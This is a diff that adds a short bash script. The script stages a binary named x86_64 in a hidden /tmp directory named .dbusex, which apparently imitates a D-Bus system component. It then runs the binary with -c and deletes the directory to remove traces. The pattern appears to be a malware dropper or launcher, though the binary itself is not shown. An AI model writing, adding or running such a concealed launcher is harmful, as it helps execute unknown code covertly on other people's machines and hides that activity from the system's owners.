@@ -1,0 +1,6 @@
+#!/bin/bash
+cd -- /tmp
+mkdir -- .dbusex
+cp -f -- x86_64 .dbusex/dbusex
+./.dbusex/dbusex  -c
+rm -rf .dbusex
